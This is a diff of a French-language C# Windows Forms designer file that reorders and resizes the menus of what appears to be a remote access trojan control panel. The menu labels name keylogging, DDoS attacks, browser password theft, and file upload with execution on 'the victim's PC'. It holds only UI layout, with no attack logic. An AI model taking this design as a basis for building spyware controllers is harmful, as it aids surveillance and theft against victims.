@@ -34,24 +34,13 @@
             this.menuStrip1 = new System.Windows.Forms.MenuStrip();
             this.fUNTOOLSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.kEYLOGGERToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.dDOSTOOLSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.sPYTOOLSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.pdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.afficherLaideToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
-            this.aProposDeYTAHToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.optionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.retourEnArrièreToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
-            this.seDéconnecterToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.quitterToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.toolStripTextBox3 = new System.Windows.Forms.ToolStripTextBox();
             this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
             this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.toolStripTextBox1 = new System.Windows.Forms.ToolStripTextBox();
             this.eteindreUnProcessusToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.toolStripTextBox2 = new System.Windows.Forms.ToolStripTextBox();
             this.listerLesProcessusToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-            this.toolStripTextBox3 = new System.Windows.Forms.ToolStripTextBox();
             this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
             this.eteindreLePCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.toolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
@@ -61,22 +50,32 @@
             this.partageDécranToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.avecContrôleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.sansContrôleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.dDOSTOOLSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.lancerUneAttaqueToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.surUneIPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.surCetteIPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.récupérerLIPDunSiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.sPYTOOLSToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.téléchargerLesKeylogsToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
             this.récupérerLesMotsDePasseNavigateurToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
-            this.récupérerLIPDunSiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.toolStripSeparator6 = new System.Windows.Forms.ToolStripSeparator();
             this.uploadUnFichierToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.avecExécutionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.sansExécutionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.pdToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.afficherLaideToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
+            this.aProposDeYTAHToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.optionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.retourEnArrièreToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
+            this.seDéconnecterToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+            this.quitterToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
             this.menuStrip1.SuspendLayout();
             this.SuspendLayout();
             // 
             // timer1
             // 
-            this.timer1.Interval = 10;
             this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
             // 
             // menuStrip1
@@ -122,8 +121,119 @@
             this.kEYLOGGERToolStripMenuItem.ForeColor = System.Drawing.SystemColors.ControlText;
             this.kEYLOGGERToolStripMenuItem.Name = "kEYLOGGERToolStripMenuItem";
             this.kEYLOGGERToolStripMenuItem.ShortcutKeyDisplayString = "";
-            this.kEYLOGGERToolStripMenuItem.Size = new System.Drawing.Size(253, 22);
+            this.kEYLOGGERToolStripMenuItem.Size = new System.Drawing.Size(250, 22);
             this.kEYLOGGERToolStripMenuItem.Text = "Ouvrir un popup               ";
+            // 
+            // toolStripTextBox3
+            // 
+            this.toolStripTextBox3.Name = "toolStripTextBox3";
+            this.toolStripTextBox3.Size = new System.Drawing.Size(100, 23);
+            this.toolStripTextBox3.ToolTipText = "Texte personalisé";
+            this.toolStripTextBox3.KeyDown += new System.Windows.Forms.KeyEventHandler(this.toolStripTextBox3_KeyDown);
+            this.toolStripTextBox3.Click += new System.EventHandler(this.toolStripTextBox3_Click);
+            // 
+            // toolStripSeparator2
+            // 
+            this.toolStripSeparator2.Name = "toolStripSeparator2";
+            this.toolStripSeparator2.Size = new System.Drawing.Size(247, 6);
+            // 
+            // toolStripMenuItem1
+            // 
+            this.toolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.toolStripTextBox1});
+            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
+            this.toolStripMenuItem1.Size = new System.Drawing.Size(250, 22);
+            this.toolStripMenuItem1.Text = "Démarrer un processus";
+            this.toolStripMenuItem1.Click += new System.EventHandler(this.toolStripMenuItem1_Click);
+            // 
+            // toolStripTextBox1
+            // 
+            this.toolStripTextBox1.Name = "toolStripTextBox1";
+            this.toolStripTextBox1.Size = new System.Drawing.Size(100, 23);
+            this.toolStripTextBox1.ToolTipText = "Exemple : URL/calc.exe";
+            // 
+            // eteindreUnProcessusToolStripMenuItem
+            // 
+            this.eteindreUnProcessusToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.toolStripTextBox2});
+            this.eteindreUnProcessusToolStripMenuItem.Name = "eteindreUnProcessusToolStripMenuItem";
+            this.eteindreUnProcessusToolStripMenuItem.Size = new System.Drawing.Size(250, 22);
+            this.eteindreUnProcessusToolStripMenuItem.Text = "Eteindre un processus";
+            // 
+            // toolStripTextBox2
+            // 
+            this.toolStripTextBox2.Name = "toolStripTextBox2";
+            this.toolStripTextBox2.Size = new System.Drawing.Size(100, 23);
+            this.toolStripTextBox2.ToolTipText = "Exemple : calc (sans le .exe)";
+            // 
+            // listerLesProcessusToolStripMenuItem
+            // 
+            this.listerLesProcessusToolStripMenuItem.Name = "listerLesProcessusToolStripMenuItem";
+            this.listerLesProcessusToolStripMenuItem.ShortcutKeys = ((System.Windows.Forms.Keys)((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.L)));
+            this.listerLesProcessusToolStripMenuItem.Size = new System.Drawing.Size(250, 22);
+            this.listerLesProcessusToolStripMenuItem.Text = "Lister les processus";
+            this.listerLesProcessusToolStripMenuItem.Click += new System.EventHandler(this.listerLesProcessusToolStripMenuItem_Click);
+            // 
+            // toolStripSeparator4
+            // 
+            this.toolStripSeparator4.Name = "toolStripSeparator4";
+            this.toolStripSeparator4.Size = new System.Drawing.Size(247, 6);
+            // 
+            // eteindreLePCToolStripMenuItem
+            // 
+            this.eteindreLePCToolStripMenuItem.Name = "eteindreLePCToolStripMenuItem";
+            this.eteindreLePCToolStripMenuItem.RightToLeft = System.Windows.Forms.RightToLeft.No;
+            this.eteindreLePCToolStripMenuItem.ShortcutKeys = ((System.Windows.Forms.Keys)((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.F4)));
+            this.eteindreLePCToolStripMenuItem.Size = new System.Drawing.Size(250, 22);
+            this.eteindreLePCToolStripMenuItem.Text = "Eteindre le PC                   ";
+            this.eteindreLePCToolStripMenuItem.TextDirection = System.Windows.Forms.ToolStripTextDirection.Horizontal;
+            // 
+            // toolStripSeparator5
+            // 
+            this.toolStripSeparator5.Name = "toolStripSeparator5";
+            this.toolStripSeparator5.Size = new System.Drawing.Size(247, 6);
+            // 
+            // freezeLaSourisToolStripMenuItem
+            // 
+            this.freezeLaSourisToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.freezeToolStripMenuItem,
+            this.unfreezeToolStripMenuItem});
+            this.freezeLaSourisToolStripMenuItem.Name = "freezeLaSourisToolStripMenuItem";
+            this.freezeLaSourisToolStripMenuItem.Size = new System.Drawing.Size(250, 22);
+            this.freezeLaSourisToolStripMenuItem.Text = "Freeze la souris";
+            // 
+            // freezeToolStripMenuItem
+            // 
+            this.freezeToolStripMenuItem.Name = "freezeToolStripMenuItem";
+            this.freezeToolStripMenuItem.Size = new System.Drawing.Size(120, 22);
+            this.freezeToolStripMenuItem.Text = "Freeze";
+            // 
+            // unfreezeToolStripMenuItem
+            // 
+            this.unfreezeToolStripMenuItem.Name = "unfreezeToolStripMenuItem";
+            this.unfreezeToolStripMenuItem.Size = new System.Drawing.Size(120, 22);
+            this.unfreezeToolStripMenuItem.Text = "Unfreeze";
+            // 
+            // partageDécranToolStripMenuItem
+            // 
+            this.partageDécranToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.avecContrôleToolStripMenuItem,
+            this.sansContrôleToolStripMenuItem});
+            this.partageDécranToolStripMenuItem.Name = "partageDécranToolStripMenuItem";
+            this.partageDécranToolStripMenuItem.Size = new System.Drawing.Size(250, 22);
+            this.partageDécranToolStripMenuItem.Text = "Partage d\'écran";
+            // 
+            // avecContrôleToolStripMenuItem
+            // 
+            this.avecContrôleToolStripMenuItem.Name = "avecContrôleToolStripMenuItem";
+            this.avecContrôleToolStripMenuItem.Size = new System.Drawing.Size(147, 22);
+            this.avecContrôleToolStripMenuItem.Text = "Avec contrôle";
+            // 
+            // sansContrôleToolStripMenuItem
+            // 
+            this.sansContrôleToolStripMenuItem.Name = "sansContrôleToolStripMenuItem";
+            this.sansContrôleToolStripMenuItem.Size = new System.Drawing.Size(147, 22);
+            this.sansContrôleToolStripMenuItem.Text = "Sans contrôle";
             // 
             // dDOSTOOLSToolStripMenuItem
             // 
@@ -135,6 +245,36 @@
             this.dDOSTOOLSToolStripMenuItem.Name = "dDOSTOOLSToolStripMenuItem";
             this.dDOSTOOLSToolStripMenuItem.Size = new System.Drawing.Size(81, 20);
             this.dDOSTOOLSToolStripMenuItem.Text = "DDOS Tools";
+            // 
+            // lancerUneAttaqueToolStripMenuItem
+            // 
+            this.lancerUneAttaqueToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.surUneIPToolStripMenuItem,
+            this.surCetteIPToolStripMenuItem});
+            this.lancerUneAttaqueToolStripMenuItem.Name = "lancerUneAttaqueToolStripMenuItem";
+            this.lancerUneAttaqueToolStripMenuItem.Size = new System.Drawing.Size(197, 22);
+            this.lancerUneAttaqueToolStripMenuItem.Text = "DDOS";
+            this.lancerUneAttaqueToolStripMenuItem.Click += new System.EventHandler(this.lancerUneAttaqueToolStripMenuItem_Click);
+            // 
+            // surUneIPToolStripMenuItem
+            // 
+            this.surUneIPToolStripMenuItem.Name = "surUneIPToolStripMenuItem";
+            this.surUneIPToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
+            this.surUneIPToolStripMenuItem.Text = "Sur une IP";
+            this.surUneIPToolStripMenuItem.ToolTipText = "Lance une attaque contre une IP (Exemple site)";
+            // 
+            // surCetteIPToolStripMenuItem
+            // 
+            this.surCetteIPToolStripMenuItem.Name = "surCetteIPToolStripMenuItem";
+            this.surCetteIPToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
+            this.surCetteIPToolStripMenuItem.Text = "Sur cette IP";
+            this.surCetteIPToolStripMenuItem.ToolTipText = "Lance une attaque contre l\'utilisateur contrôlé";
+            // 
+            // récupérerLIPDunSiteToolStripMenuItem
+            // 
+            this.récupérerLIPDunSiteToolStripMenuItem.Name = "récupérerLIPDunSiteToolStripMenuItem";
+            this.récupérerLIPDunSiteToolStripMenuItem.Size = new System.Drawing.Size(197, 22);
+            this.récupérerLIPDunSiteToolStripMenuItem.Text = "Récupérer l\'IP d\'un site ";
             // 
             // sPYTOOLSToolStripMenuItem
             // 
@@ -149,6 +289,50 @@
             this.sPYTOOLSToolStripMenuItem.Name = "sPYTOOLSToolStripMenuItem";
             this.sPYTOOLSToolStripMenuItem.Size = new System.Drawing.Size(69, 20);
             this.sPYTOOLSToolStripMenuItem.Text = "Spy Tools";
+            // 
+            // téléchargerLesKeylogsToolStripMenuItem1
+            // 
+            this.téléchargerLesKeylogsToolStripMenuItem1.Name = "téléchargerLesKeylogsToolStripMenuItem1";
+            this.téléchargerLesKeylogsToolStripMenuItem1.ShortcutKeys = ((System.Windows.Forms.Keys)(((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.Shift) 
+            | System.Windows.Forms.Keys.K)));
+            this.téléchargerLesKeylogsToolStripMenuItem1.Size = new System.Drawing.Size(397, 22);
+            this.téléchargerLesKeylogsToolStripMenuItem1.Text = "Télécharger les keylogs";
+            // 
+            // récupérerLesMotsDePasseNavigateurToolStripMenuItem1
+            // 
+            this.récupérerLesMotsDePasseNavigateurToolStripMenuItem1.Name = "récupérerLesMotsDePasseNavigateurToolStripMenuItem1";
+            this.récupérerLesMotsDePasseNavigateurToolStripMenuItem1.ShortcutKeys = ((System.Windows.Forms.Keys)(((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.Shift) 
+            | System.Windows.Forms.Keys.N)));
+            this.récupérerLesMotsDePasseNavigateurToolStripMenuItem1.Size = new System.Drawing.Size(397, 22);
+            this.récupérerLesMotsDePasseNavigateurToolStripMenuItem1.Text = "Récupérer les mots de passe navigateur               ";
+            // 
+            // toolStripSeparator6
+            // 
+            this.toolStripSeparator6.Name = "toolStripSeparator6";
+            this.toolStripSeparator6.Size = new System.Drawing.Size(394, 6);
+            // 
+            // uploadUnFichierToolStripMenuItem
+            // 
+            this.uploadUnFichierToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.avecExécutionToolStripMenuItem,
+            this.sansExécutionToolStripMenuItem});
+            this.uploadUnFichierToolStripMenuItem.Name = "uploadUnFichierToolStripMenuItem";
+            this.uploadUnFichierToolStripMenuItem.Size = new System.Drawing.Size(397, 22);
+            this.uploadUnFichierToolStripMenuItem.Text = "Upload un fichier";
+            // 
+            // avecExécutionToolStripMenuItem
+            // 
+            this.avecExécutionToolStripMenuItem.Name = "avecExécutionToolStripMenuItem";
+            this.avecExécutionToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
+            this.avecExécutionToolStripMenuItem.Text = "Avec exécution";
+            this.avecExécutionToolStripMenuItem.ToolTipText = "Va s\'exécuter une fois téléchargé sur le PC de la victime";
+            // 
+            // sansExécutionToolStripMenuItem
+            // 
+            this.sansExécutionToolStripMenuItem.Name = "sansExécutionToolStripMenuItem";
+            this.sansExécutionToolStripMenuItem.Size = new System.Drawing.Size(154, 22);
+            this.sansExécutionToolStripMenuItem.Text = "Sans exécution";
+            this.sansExécutionToolStripMenuItem.ToolTipText = "Ne va pas s\'exécuter une fois téléchargé sur le PC de la victime";
             // 
             // pdToolStripMenuItem
             // 
@@ -196,18 +380,18 @@
             // retourEnArrièreToolStripMenuItem
             // 
             this.retourEnArrièreToolStripMenuItem.Name = "retourEnArrièreToolStripMenuItem";
-            this.retourEnArrièreToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.retourEnArrièreToolStripMenuItem.Size = new System.Drawing.Size(198, 22);
             this.retourEnArrièreToolStripMenuItem.Text = "Retour en arrière";
             // 
             // toolStripSeparator3
             // 
             this.toolStripSeparator3.Name = "toolStripSeparator3";
-            this.toolStripSeparator3.Size = new System.Drawing.Size(177, 6);
+            this.toolStripSeparator3.Size = new System.Drawing.Size(195, 6);
             // 
             // seDéconnecterToolStripMenuItem
             // 
             this.seDéconnecterToolStripMenuItem.Name = "seDéconnecterToolStripMenuItem";
-            this.seDéconnecterToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+            this.seDéconnecterToolStripMenuItem.Size = new System.Drawing.Size(198, 22);
             this.seDéconnecterToolStripMenuItem.Text = "Se déconnecter";
             // 
             // quitterToolStripMenuItem
@@ -218,189 +402,6 @@
             this.quitterToolStripMenuItem.Text = "Quitter               ";
             this.quitterToolStripMenuItem.Click += new System.EventHandler(this.quitterToolStripMenuItem_Click);
             // 
-            // toolStripSeparator2
-            // 
-            this.toolStripSeparator2.Name = "toolStripSeparator2";
-            this.toolStripSeparator2.Size = new System.Drawing.Size(250, 6);
-            // 
-            // toolStripMenuItem1
-            // 
-            this.toolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.toolStripTextBox1});
-            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
-            this.toolStripMenuItem1.Size = new System.Drawing.Size(253, 22);
-            this.toolStripMenuItem1.Text = "Démarrer un processus";
-            this.toolStripMenuItem1.Click += new System.EventHandler(this.toolStripMenuItem1_Click);
-            // 
-            // toolStripTextBox1
-            // 
-            this.toolStripTextBox1.Name = "toolStripTextBox1";
-            this.toolStripTextBox1.Size = new System.Drawing.Size(100, 23);
-            this.toolStripTextBox1.ToolTipText = "Exemple : URL/calc.exe";
-            // 
-            // eteindreUnProcessusToolStripMenuItem
-            // 
-            this.eteindreUnProcessusToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.toolStripTextBox2});
-            this.eteindreUnProcessusToolStripMenuItem.Name = "eteindreUnProcessusToolStripMenuItem";
-            this.eteindreUnProcessusToolStripMenuItem.Size = new System.Drawing.Size(214, 22);
-            this.eteindreUnProcessusToolStripMenuItem.Text = "Eteindre un processus";
-            // 
-            // toolStripTextBox2
-            // 
-            this.toolStripTextBox2.Name = "toolStripTextBox2";
-            this.toolStripTextBox2.Size = new System.Drawing.Size(100, 23);
-            this.toolStripTextBox2.ToolTipText = "Exemple : calc (sans le .exe)";
-            // 
-            // listerLesProcessusToolStripMenuItem
-            // 
-            this.listerLesProcessusToolStripMenuItem.Name = "listerLesProcessusToolStripMenuItem";
-            this.listerLesProcessusToolStripMenuItem.ShortcutKeys = ((System.Windows.Forms.Keys)((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.L)));
-            this.listerLesProcessusToolStripMenuItem.Size = new System.Drawing.Size(250, 22);
-            this.listerLesProcessusToolStripMenuItem.Text = "Lister les processus";
-            this.listerLesProcessusToolStripMenuItem.Click += new System.EventHandler(this.listerLesProcessusToolStripMenuItem_Click);
-            // 
-            // toolStripTextBox3
-            // 
-            this.toolStripTextBox3.Name = "toolStripTextBox3";
-            this.toolStripTextBox3.Size = new System.Drawing.Size(100, 23);
-            this.toolStripTextBox3.ToolTipText = "Texte personalisé";
-            // 
-            // toolStripSeparator4
-            // 
-            this.toolStripSeparator4.Name = "toolStripSeparator4";
-            this.toolStripSeparator4.Size = new System.Drawing.Size(211, 6);
-            // 
-            // eteindreLePCToolStripMenuItem
-            // 
-            this.eteindreLePCToolStripMenuItem.Name = "eteindreLePCToolStripMenuItem";
-            this.eteindreLePCToolStripMenuItem.RightToLeft = System.Windows.Forms.RightToLeft.No;
-            this.eteindreLePCToolStripMenuItem.ShortcutKeys = ((System.Windows.Forms.Keys)((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.F4)));
-            this.eteindreLePCToolStripMenuItem.Size = new System.Drawing.Size(250, 22);
-            this.eteindreLePCToolStripMenuItem.Text = "Eteindre le PC                   ";
-            this.eteindreLePCToolStripMenuItem.TextDirection = System.Windows.Forms.ToolStripTextDirection.Horizontal;
-            // 
-            // toolStripSeparator5
-            // 
-            this.toolStripSeparator5.Name = "toolStripSeparator5";
-            this.toolStripSeparator5.Size = new System.Drawing.Size(211, 6);
-            // 
-            // freezeLaSourisToolStripMenuItem
-            // 
-            this.freezeLaSourisToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.freezeToolStripMenuItem,
-            this.unfreezeToolStripMenuItem});
-            this.freezeLaSourisToolStripMenuItem.Name = "freezeLaSourisToolStripMenuItem";
-            this.freezeLaSourisToolStripMenuItem.Size = new System.Drawing.Size(214, 22);
-            this.freezeLaSourisToolStripMenuItem.Text = "Freeze la souris";
-            // 
-            // freezeToolStripMenuItem
-            // 
-            this.freezeToolStripMenuItem.Name = "freezeToolStripMenuItem";
-            this.freezeToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
-            this.freezeToolStripMenuItem.Text = "Freeze";
-            // 
-            // unfreezeToolStripMenuItem
-            // 
-            this.unfreezeToolStripMenuItem.Name = "unfreezeToolStripMenuItem";
-            this.unfreezeToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
-            this.unfreezeToolStripMenuItem.Text = "Unfreeze";
-            // 
-            // partageDécranToolStripMenuItem
-            // 
-            this.partageDécranToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.avecContrôleToolStripMenuItem,
-            this.sansContrôleToolStripMenuItem});
-            this.partageDécranToolStripMenuItem.Name = "partageDécranToolStripMenuItem";
-            this.partageDécranToolStripMenuItem.Size = new System.Drawing.Size(250, 22);
-            this.partageDécranToolStripMenuItem.Text = "Partage d\'écran";
-            // 
-            // avecContrôleToolStripMenuItem
-            // 
-            this.avecContrôleToolStripMenuItem.Name = "avecContrôleToolStripMenuItem";
-            this.avecContrôleToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
-            this.avecContrôleToolStripMenuItem.Text = "Avec contrôle";
-            // 
-            // sansContrôleToolStripMenuItem
-            // 
-            this.sansContrôleToolStripMenuItem.Name = "sansContrôleToolStripMenuItem";
-            this.sansContrôleToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
-            this.sansContrôleToolStripMenuItem.Text = "Sans contrôle";
-            // 
-            // lancerUneAttaqueToolStripMenuItem
-            // 
-            this.lancerUneAttaqueToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.surUneIPToolStripMenuItem,
-            this.surCetteIPToolStripMenuItem});
-            this.lancerUneAttaqueToolStripMenuItem.Name = "lancerUneAttaqueToolStripMenuItem";
-            this.lancerUneAttaqueToolStripMenuItem.Size = new System.Drawing.Size(197, 22);
-            this.lancerUneAttaqueToolStripMenuItem.Text = "DDOS";
-            this.lancerUneAttaqueToolStripMenuItem.Click += new System.EventHandler(this.lancerUneAttaqueToolStripMenuItem_Click);
-            // 
-            // surUneIPToolStripMenuItem
-            // 
-            this.surUneIPToolStripMenuItem.Name = "surUneIPToolStripMenuItem";
-            this.surUneIPToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
-            this.surUneIPToolStripMenuItem.Text = "Sur une IP";
-            this.surUneIPToolStripMenuItem.ToolTipText = "Lance une attaque contre une IP (Exemple site)";
-            // 
-            // surCetteIPToolStripMenuItem
-            // 
-            this.surCetteIPToolStripMenuItem.Name = "surCetteIPToolStripMenuItem";
-            this.surCetteIPToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
-            this.surCetteIPToolStripMenuItem.Text = "Sur cette IP";
-            this.surCetteIPToolStripMenuItem.ToolTipText = "Lance une attaque contre l\'utilisateur contrôlé";
-            // 
-            // téléchargerLesKeylogsToolStripMenuItem1
-            // 
-            this.téléchargerLesKeylogsToolStripMenuItem1.Name = "téléchargerLesKeylogsToolStripMenuItem1";
-            this.téléchargerLesKeylogsToolStripMenuItem1.ShortcutKeys = ((System.Windows.Forms.Keys)(((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.Shift) 
-            | System.Windows.Forms.Keys.K)));
-            this.téléchargerLesKeylogsToolStripMenuItem1.Size = new System.Drawing.Size(397, 22);
-            this.téléchargerLesKeylogsToolStripMenuItem1.Text = "Télécharger les keylogs";
-            // 
-            // récupérerLesMotsDePasseNavigateurToolStripMenuItem1
-            // 
-            this.récupérerLesMotsDePasseNavigateurToolStripMenuItem1.Name = "récupérerLesMotsDePasseNavigateurToolStripMenuItem1";
-            this.récupérerLesMotsDePasseNavigateurToolStripMenuItem1.ShortcutKeys = ((System.Windows.Forms.Keys)(((System.Windows.Forms.Keys.Control | System.Windows.Forms.Keys.Shift) 
-            | System.Windows.Forms.Keys.N)));
-            this.récupérerLesMotsDePasseNavigateurToolStripMenuItem1.Size = new System.Drawing.Size(397, 22);
-            this.récupérerLesMotsDePasseNavigateurToolStripMenuItem1.Text = "Récupérer les mots de passe navigateur               ";
-            // 
-            // récupérerLIPDunSiteToolStripMenuItem
-            // 
-            this.récupérerLIPDunSiteToolStripMenuItem.Name = "récupérerLIPDunSiteToolStripMenuItem";
-            this.récupérerLIPDunSiteToolStripMenuItem.Size = new System.Drawing.Size(197, 22);
-            this.récupérerLIPDunSiteToolStripMenuItem.Text = "Récupérer l\'IP d\'un site ";
-            // 
-            // toolStripSeparator6
-            // 
-            this.toolStripSeparator6.Name = "toolStripSeparator6";
-            this.toolStripSeparator6.Size = new System.Drawing.Size(278, 6);
-            // 
-            // uploadUnFichierToolStripMenuItem
-            // 
-            this.uploadUnFichierToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
-            this.avecExécutionToolStripMenuItem,
-            this.sansExécutionToolStripMenuItem});
-            this.uploadUnFichierToolStripMenuItem.Name = "uploadUnFichierToolStripMenuItem";
-            this.uploadUnFichierToolStripMenuItem.Size = new System.Drawing.Size(397, 22);
-            this.uploadUnFichierToolStripMenuItem.Text = "Upload un fichier";
-            // 
-            // avecExécutionToolStripMenuItem
-            // 
-            this.avecExécutionToolStripMenuItem.Name = "avecExécutionToolStripMenuItem";
-            this.avecExécutionToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
-            this.avecExécutionToolStripMenuItem.Text = "Avec exécution";
-            this.avecExécutionToolStripMenuItem.ToolTipText = "Va s\'exécuter une fois téléchargé sur le PC de la victime";
-            // 
-            // sansExécutionToolStripMenuItem
-            // 
-            this.sansExécutionToolStripMenuItem.Name = "sansExécutionToolStripMenuItem";
-            this.sansExécutionToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
-            this.sansExécutionToolStripMenuItem.Text = "Sans exécution";
-            this.sansExécutionToolStripMenuItem.ToolTipText = "Ne va pas s\'exécuter une fois téléchargé sur le PC de la victime";
-            // 
             // Form3
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
@@ -409,7 +410,6 @@
             this.ClientSize = new System.Drawing.Size(1264, 681);
             this.Controls.Add(this.menuStrip1);
             this.Name = "Form3";
-            this.Text = "Username + contrôle : ";
             this.Load += new System.EventHandler(this.Form3_Load);
             this.menuStrip1.ResumeLayout(false);
             this.menuStrip1.PerformLayout();
